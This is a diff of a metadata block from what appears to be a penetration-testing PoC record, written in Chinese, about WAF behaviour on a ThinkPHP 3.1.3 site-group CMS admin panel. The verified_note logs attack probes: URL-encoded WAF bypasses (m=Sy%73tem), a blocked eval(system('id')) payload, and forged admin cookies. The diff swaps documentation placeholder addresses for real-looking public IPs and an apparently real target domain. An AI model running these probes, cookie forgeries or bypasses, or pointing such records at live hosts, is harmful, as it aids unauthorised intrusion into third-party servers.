@@ -8,11 +8,11 @@
 - **severity**: low
 - **source**: self
 - **verified**: 1
-- **verified_note**: 实测于 192.0.2.1（源站）与 192.0.2.3/.84/.88（CDN）：GET /index.php?g=Admin&m=System&a=index → 403/548B/无 Set-Cookie；GET /index.php?g=Admin&m=Sy%73tem&a=index → 302→/ + PHPSESSID；GET /index.php?g=Admin&m=Main&a=index&system=1 → 403/548B；GET /index.php/Admin/System/index → 302；POST body q=eval(system('id')) → 403/47B "Access Denied: Dangerous function call detected"；GET /index.php?g=Admin&m=%73ystem（小写 s）→ 404。30 个 action 全矩阵 + 无 cookie/伪造 admin_user+admin_id/再加 admin_pass 三身份对照全部 302，无例外。
+- **verified_note**: 实测于 45.151.135.176（源站）与 103.143.81.78/.84/.88（CDN）：GET /index.php?g=Admin&m=System&a=index → 403/548B/无 Set-Cookie；GET /index.php?g=Admin&m=Sy%73tem&a=index → 302→/ + PHPSESSID；GET /index.php?g=Admin&m=Main&a=index&system=1 → 403/548B；GET /index.php/Admin/System/index → 302；POST body q=eval(system('id')) → 403/47B "Access Denied: Dangerous function call detected"；GET /index.php?g=Admin&m=%73ystem（小写 s）→ 404。30 个 action 全矩阵 + 无 cookie/伪造 admin_user+admin_id/再加 admin_pass 三身份对照全部 302，无例外。
 - **path**: pocs/thinkphp-3.1.3-站群-cms-admin-控制器-403-假分叉-判别-实为-nginx-层危险函数/poc.txt
 - **tags**: thinkphp3.1.3,站群,waf,403假分叉,url编码绕过,控制器预言机,负面情报
 - **created_at**: 2026-10-28T18:18:25.252Z
-- **engine**: 192.0.2.1 / https://target479.example.com
+- **engine**: 45.151.135.176 / https://thbac1dsua6v.csnsg36j8n.xyz
 
 ## 描述
 
